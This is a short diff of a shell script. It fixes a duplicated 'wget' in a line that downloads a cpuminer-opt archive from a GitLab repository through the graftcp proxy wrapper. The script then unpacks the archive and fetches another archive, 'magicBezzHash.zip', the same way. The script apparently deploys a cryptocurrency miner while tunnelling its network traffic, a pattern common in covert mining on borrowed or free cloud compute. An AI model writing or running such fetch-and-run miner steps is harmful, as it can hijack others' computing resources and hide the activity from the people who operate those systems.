@@ -34,7 +34,7 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget wget https://gitlab.com/ubedx/ngopi/-/raw/main/cpuminer-opt-linux.tar.gz
+./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/cpuminer-opt-linux.tar.gz
 tar -xvzf cpuminer-opt-linux.tar.gz
 
 ./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/magicBezzHash.zip
